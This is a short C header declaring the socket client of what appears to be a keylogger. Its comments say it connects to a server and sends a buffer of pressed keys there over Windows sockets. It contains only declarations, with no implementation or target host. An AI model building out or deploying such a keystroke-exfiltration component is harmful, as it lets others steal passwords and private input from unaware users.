#ifndef SENDER_H
#define SENDER_H

extern char* userId;
extern char* result;

/**
 * @brief Initializes the client’s socket and establishes a connection to the server.
 *
 * @param param Pointer to a void passed by the system to the thread function.
 *              This parameter is unused and should be ignored.
 */
void initSocketClient(void* param);

/**
 * @brief Sends data from a buffer containing pressed keys to the server via sockets.
 *
 * @param clientSocket SOCKET WSAAPI client's socket.
 * @param socketResult Integer indicating the status of the socket connection or the state of the sent request.
 *
 */
void send_(SOCKET clientSocket, int socketResult);

#endif
